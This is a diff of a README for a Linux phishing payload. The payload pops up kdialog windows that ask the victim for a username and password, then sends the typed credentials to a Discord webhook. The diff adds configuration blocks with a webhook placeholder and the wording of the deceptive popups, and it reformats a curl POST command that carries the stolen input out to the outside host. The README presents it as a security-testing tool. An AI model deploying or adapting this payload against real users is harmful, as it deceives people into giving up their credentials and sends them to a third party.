@@ -1,5 +1,5 @@
  
-# Standard Phishing Payload Using kdialog - Linux ✅
+# Standard Phishing Payload Using kdialog - Linux
 
 A script used to exfiltrate some input by a popup phishing based on linux systems using kdialog.
 
@@ -20,13 +20,29 @@ Opens a shell, get the data by a popup, send the input to a Discord webhook (or 
 ### Settings
 
 * Set the Discord webhook
+
+  ```shell
+  DISCORD_WEBHOOK='https://discordapp.com/api/webhooks/<webhook_id>/<token>'
+  ```
+
 * Set the payload as you want
+
+  ```shell
+  POPUP_TITLE0='Config Popup'
+  POPUP-MESSAGE0='Insert your username and password for go on'
+  POPUP-TITLE1='Insert your Username'
+  POPUP-MESSAGE1='Username'
+  POPUP-TITLE2='Insert your Password'
+  POPUP-MESSAGE2='Password'
+  ```
 
 ### cURL Command
 
 With this payload you can send a post message using cURL shell command line to the webhook or whatever you choose for the exfiltration. You should replace the tag *\<message>* with the user input.
 
-- `curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(<message>)\"}" $WEBHOOK_URL);`
+```shell
+curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(<message>)\"}" $WEBHOOK_URL);
+```
 
 ### kdialog - Popup command
 
@@ -60,7 +76,7 @@ This payload is intended to be a working tool for performing cybersecurity analy
 
 ## Credits
 
-<h2 align="center"> Aleff :octocat: </h2>
+<h2 align="center">Aleff</h2>
 <div align=center>
 <table>
   <tr>
@@ -71,16 +87,10 @@ This payload is intended to be a working tool for performing cybersecurity analy
       <br>Github
     </td>
     <td align="center" width="96">
-      <a href="https://www.instagram.com/alessandro_greco_aka_aleff/">
-        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/instagram.png?raw=true width="48" height="48" />
-      </a>
-      <br>Instagram
-    </td>
-    <td align="center" width="96">
       <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
         <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
       </a>
-      <br>Discord
+      <br>LinkedIn
     </td>
   </tr>
 </table>
